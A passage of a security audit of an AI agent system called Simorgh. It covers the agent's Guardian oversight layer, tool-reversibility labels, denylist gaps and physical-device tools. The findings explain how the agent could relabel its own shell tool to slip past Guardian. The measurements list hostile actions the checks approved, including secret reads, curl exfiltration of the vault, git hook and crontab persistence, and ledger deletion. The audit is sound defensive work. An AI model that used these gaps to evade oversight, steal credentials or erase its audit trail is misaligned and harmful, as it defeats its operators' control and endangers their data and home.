- **claim:** Guardian builds `ToolInfo` from `p["reversibility"]` in the proposal (service.py:504, 522-526) and does not consume `tool.registered`; the label comes from Orchestration's `_TOOL_POLICY` (orchestration/tools.py:630-636, 693), and `simorgh/orchestration/` is writable and not protected, so a self-patch to one table (or one `replace_in_file`, approved reversible) re-labels `run_shell` as read_only and every mode/reversibility rule then treats it as a read.
- **evidence:**
  - simorgh/guardian/service.py:97-110 `consumes` has no TOOL_REGISTERED; service.py:522-526 `ToolInfo(name=proposal.tool, read_only=proposal.reversibility == "read_only", reversibility=proposal.reversibility)`
  - simorgh/orchestration/tools.py:693 `reversibility, network = _TOOL_POLICY.get(tool, ("irreversible", False))`
  - Offline pipeline: `approved replace_in_file {'path': 'simorgh/orchestration/tools.py', ...}` (orchestration is not in DEFAULT_PROTECTED_SUBJECTS, guardian/config.py:21-41)
  - contracts/home/policy.py:5-8 states the intent 'so Guardian never has to trust a label the proposer supplied' -- Guardian does exactly that
- **why it matters:** The HMAC binds the decision to the args, but the decision itself was made on a label the (unprotected) proposer chose. The corrigibility boundary is drawn around guardian/execution/kernel/contracts, yet the input that most of the pipeline branches on originates outside it.
- **recommendation:** Have Guardian subscribe to `tool.registered` and keep its own name->reversibility map (Execution is protected; its declarations are the trustworthy source), ignoring the proposal's field except for the `home_call` per-call classification, which Guardian should recompute itself with `classify_call`. Consider adding `simorgh/orchestration/tools.py` and `profiles.py` to the protected list.
- **confidence:** 0.85

##### 7. The HMAC token is real between processes and ceremony within one; the actual attack surface is upstream of it

- **kind:** over-engineering
- **severity:** low
- **claim:** Inside one Python process every subsystem shares an interpreter, so the token defends against bugs and accidental publishes (which it has genuinely caught -- the redelivery/replay case) rather than against a compromised peer; meanwhile the decisions it seals are made on unverified inputs (finding above) and the effects it gates run unconfined (findings above).
- **evidence:**
  - simorgh/contracts/security.py:37-58 HMAC over action_id|tool|args_sha|expiry; verifier.py:43-57
  - simorgh/kernel/registry.py:50 `NEEDS_HMAC_SECRET = {"guardian","execution"}` -- the secret is scoped, which is the right shape, but a Worker (kernel/service.py:604-641) is a separate process only in the multi-process configuration
  - simorgh/guardian/service.py:139-157 the dedupe map exists because a redelivered proposal minted a second token that then tripped the replay guard -- the mechanism catches ordinary faults
- **why it matters:** Not wrong, and cheap; but the creator should not read 'HMAC re-verified by Execution' as the safety story. It proves the executed action is the approved action; it says nothing about whether the approval was sound or the effect bounded.
- **recommendation:** Keep it, document its actual threat model in one sentence ('proves what ran is what was approved; not a defence against in-process code'), and spend the next effort on process confinement, which is where the missing boundary is.
- **confidence:** 0.85

##### 8. Physical-world tools are gated identically to code: one label, one boolean, no channel-level distinction

- **kind:** wrong-design
- **severity:** medium
- **claim:** The 21 house/camera/Ring tools and 17 TV/media tools use the same `reversibility` constant and the same ReversibilityRule as file edits; `cam_setup`, `cam_stream`, `cam_ptz`, `cam_light`, `ring_setup`, `cast_*`, `tv_key` are all `reversible` and therefore never escalate in any mode; the only per-call classification is `home_call`, computed at proposal time without device_class or alarm state and then discarded by the tool.
- **evidence:**
  - Tool enumeration: 98 tools, Counter({'reversible': 51, 'read_only': 37, 'irreversible': 10}); e.g. `cam_ptz ro=False rev=reversible`, `tv_key rev=reversible`, `cast_play rev=reversible`
  - simorgh/orchestration/tools.py:698-704 classifies `home_call` with `args.get("target")` and `data` only; execution/home/tools.py:255-262 classifies again with device_class and alarm_state, stores `worst` in metadata
  - simorgh/guardian/rules.py:720-740 ReversibilityRule is the only place physical vs code is decided, via the same `r` string
- **why it matters:** For one family on one laptop the right question is not 'can this be undone' but 'does this act on the world'. A PTZ camera pointed at a neighbour or a TV turned to full volume at 2am is reversible and still not something a chat turn should do unattended.
- **recommendation:** Add a second axis to the tool protocol, `domain: code | world | self`, set once in each tool class, and give Guardian a `WorldRule` that escalates `world` actions from autonomous origins (curiosity/reflection/project) and lets human-originated chat ones through -- a small rule, and it reuses the `origin` field Guardian already tracks (service.py:242-244).
- **confidence:** 0.8

##### 9. Adaptive immunity never learns from shell or command rejections

- **kind:** bug
- **severity:** low
- **claim:** `_remember_rejection` reads only `args["code"]`, so a denied `run_shell`/`run_container`/`run_remote` proposal (which carry `command`) is never added to the rejected index, and ImmunityRule can never match a re-worded shell attempt; the `guardian.review` path also runs only the denylist.
- **evidence:**
  - simorgh/guardian/service.py:644-648 `code = proposal.args.get("code")`; `if not isinstance(code, str) or not code: return`
  - simorgh/guardian/rules.py:352-368 `_code_text` was fixed to join `code` and `command` for the rules, but the remember side was not
  - simorgh/guardian/service.py:208-237 `_on_review` -> `layers_run: ["denylist"]`
- **why it matters:** Same 'one side implemented' shape the project already names as its dominant bug; the immunity feature is half-wired for the most dangerous tool.
- **recommendation:** Use `rule_defs._code_text(proposal)` in `_remember_rejection` and run the full pipeline's static rules (protected, denylist, bandit) in `_on_review`.
- **confidence:** 0.9

##### 10. Chat sessions edit the live checkout while patch tasks get a worktree, so the discipline covers the less common path

- **kind:** right-design-undermined
- **severity:** medium
- **claim:** `WORKTREE_KINDS = {"patch","skill"}` so only those task kinds branch; the CHAT profile carries `apply_source_patch`, `replace_in_file`, `run_script` and `install_package`, all of which write to or run against the live tree the running process imported from, with no landing gate at all.
- **evidence:**
  - simorgh/orchestration/session.py:59 `WORKTREE_KINDS = frozenset({"patch", "skill"})`
  - simorgh/orchestration/profiles.py:12-66 CHAT tools include `apply_source_patch`, `replace_in_file`, `install_package`, `run_script`
  - simorgh/execution/tools.py:109-124 `tool_root` returns `config.repo_root` when `ctx.root is None`
  - docs/plans/worktree-landing-design.md 'Why' section lists 'a process standing on a moving floor' as the problem worktrees solve
- **why it matters:** The worktree design is right; the exemption swallows it. A chat turn is the most frequent way the creator drives Sim.
- **recommendation:** Restrict chat-profile writes to `workspace/` (the stated reason chat got write tools was 'write access to its workspace directory'), and route any `simorgh/`, `tests/`, `tools/`, `docs/` edit from chat through `start_task` so it gets a worktree and a landing.
- **confidence:** 0.8

##### 11. The hand-maintained denylist is doing security work it cannot do, and the project keeps paying to patch it

- **kind:** wrong-design
- **severity:** medium
- **claim:** Thirteen regexes (guardian/config.py:46-79) plus 32 shell refusals (shell.py:53-118) plus bandit HIGH-only are the code-payload boundary; the rules module has 9 commits since 2026-09-07, most of them closing an observer-found bypass, and the denylist still misses `os.execvp`, `os.spawn*`, `os.fork`, `asyncio.create_subprocess_*`, `multiprocessing`, `importlib.import_module`, `curl`/`ssh` in a shell, and any concatenated path.
- **evidence:**
  - `git log --oneline --since=2026-09-07 -- simorgh/guardian/rules.py | wc -l` -> 9
  - shell.py:17-27 'Not an attempt at a security boundary -- a shell has no such thing'; config.py:213-215 same admission for `shell_refusals`
  - Offline pipeline with default Config and bandit on: `os.execvp` and `asyncio.create_subprocess_shell` payloads approved; `os.popen` denied (B605)
  - `which shellcheck` -> not installed, so ShellcheckRule abstains on this machine (rules.py:589-590)
- **why it matters:** The authors already know this; the finding is that the architecture leans on it anyway because there is no confinement layer beneath. Every observer wave will find another string.
- **recommendation:** Treat the denylist as a linter for the model's habits (keep it, stop extending it) and put the security boundary in the OS: macOS `sandbox-exec` profiles per tool, or a dedicated user account for the subprocess-spawning tools. That single change makes findings 2, 4 and most of 3 moot.
- **confidence:** 0.85


### measurements

- Tool enumeration via `builtin_tools(Config(), secrets={})`: TOTAL 98; Counter({'reversible': 51, 'read_only': 37, 'irreversible': 10}); plus 3 worktree tools (worktree_land irreversible)
- Irreversible tools: cam_siren, install_package, memory_forget, notify, overheard_note, ring_siren, run_container, run_script, run_shell, sim_command, worktree_land
- Guardian pipeline: 12 rules ['paused','mode','protected','scope','denylist','static_analysis','shellcheck','package','grant','immunity','budget','reversibility']; ScopeRule always abstains; grant_capability tool not registered anywhere
- shell refusal patterns: 32; guardian denylist patterns: 13; protected subjects: 12
- bandit installed: True; shellcheck: not installed
- Live config: ~/.simorgh/simorgh.toml has no [guardian] section; `env | grep SIMORGH` empty; kernel/service.py:203 therefore sets irreversible_requires_human=False
- Offline pipeline, live default (auto-approve on): approved for `cat ~/.simorgh/secrets.toml`, curl exfil of the vault, write to .git/hooks/post-checkout, write tests/conftest.py, write pytest.ini, `cp ... simorgh/guardi*/rules.py`, `git config core.hooksPath`, launchctl load, crontab install, ssh, concatenated-path open() of guardian/rules.py, `find ~/.simorgh/ledger -delete`, `shutil.rmtree(ledger)`, overwrite secrets.toml, `cd /Users/saeed/ws/Simorgh && git commit`, `pip install`, `curl | bash` via file, osascript, keychain read, ~/.ssh and ~/.aws reads, home_call lock.unlock, cam_siren; denied only for the literal `simorgh/guardian/rules.py` and `~/.simorgh/simorgh.toml`
- Offline pipeline, dataclass default (auto-approve off): apply_skill with os.execvp / asyncio.create_subprocess_shell / concatenated-path write_text -> approved; skill:helper -> approved; run_python_sandboxed os.execvp -> approved; os.popen -> denied (bandit B605); run_shell / home_call lock.unlock / worktree_land -> needs_human
- ~/.simorgh/secrets.toml: -rw------- 2116 bytes; SIM_API_TOKEN key present (1 match); ~/.simorgh/ledger: 1.4G
- .git/hooks contains only sample files today; tests/conftest.py, pytest.ini, pyproject.toml do not exist; root conftest.py exists
- `git log --since=2026-09-07 -- simorgh/guardian/rules.py | wc -l` -> 9 commits

